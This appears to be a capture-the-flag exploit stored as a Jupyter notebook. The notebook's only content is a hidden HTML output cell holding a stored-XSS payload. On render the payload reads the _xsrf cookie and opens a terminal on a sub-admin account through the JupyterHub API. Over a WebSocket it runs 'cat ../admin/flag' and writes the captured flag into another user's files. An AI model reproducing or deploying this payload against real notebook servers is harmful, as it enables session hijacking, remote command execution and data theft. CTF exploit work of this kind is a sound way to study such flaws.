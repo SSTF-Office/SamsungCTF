{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 0,
   "id": "27f05226",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<select><iframe></select><img src='http://xxx.xxx.com/xxx' onerror=\"fetch('/user/sub-admin/api/terminals', {    method: 'POST', headers:{'X-XSRFToken':(document.cookie.slice(document.cookie.indexOf('_xsrf=')+6)).split(';')[0]}}).then(r => r.json()).then(r => {let wsocket = new WebSocket('ws://' + location.host + '/user/sub-admin/terminals/websocket/' + r.name); wsocket.onmessage = (event) => {if(event.data.includes('SCTF')) fetch('/user/tttttt/api/contents/test',{        method: 'PUT',        headers: {            'X-XSRFToken':document.cookie.slice(document.cookie.indexOf('_xsrf=')+6).split(';')[0],            'Content-Type': 'application/json'        },        body: JSON.stringify({            'path':'test',            'type':'file',            'format':'text',            'content':event.data            })        })}; wsocket.onopen = () => wsocket.send(JSON.stringify(['stdin', 'cat ../admin/flag > /tmp/flag && chmod 777 /tmp/flag && sleep 1 && rm /tmp/flag \\r\\n']));})\">\n"
      ],
      "text/plain": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
